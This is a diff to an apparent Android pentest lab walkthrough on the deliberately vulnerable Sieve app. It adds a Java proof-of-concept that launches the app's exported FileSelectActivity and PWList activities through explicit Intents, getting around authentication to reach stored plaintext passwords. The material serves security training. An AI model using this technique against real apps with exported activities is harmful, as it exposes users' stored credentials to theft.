@@ -44,4 +44,48 @@
 14. **Identify Security Vulnerability**: Realize that plaintext passwords are accessible without authentication, potentially exposing users to password theft through malicious apps.
 
     <figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
-15. I will let the part of creating APP POC for you ;)
+15. Example code for Exploit POC
+
+```java
+import android.content.Intent;
+import android.os.Bundle;
+import android.support.v7.app.AppCompatActivity;
+import android.view.View;
+import android.widget.Button;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        // Button to start FileSelectActivity
+        Button fileSelectButton = findViewById(R.id.file_select_button);
+        fileSelectButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                // Create an Intent to start the FileSelectActivity
+                Intent intent = new Intent();
+                intent.setClassName("com.mwr.example.sieve", "com.mwr.example.sieve.FileSelectActivity");
+                startActivity(intent);
+            }
+        });
+
+        // Button to start PWList Activity
+        Button pwListButton = findViewById(R.id.pw_list_button);
+        pwListButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                // Create an Intent to start the PWList Activity
+                Intent intent = new Intent();
+                intent.setClassName("com.mwr.example.sieve", "com.mwr.example.sieve.PWList");
+                startActivity(intent);
+            }
+        });
+    }
+}
+
+```
+
+1.
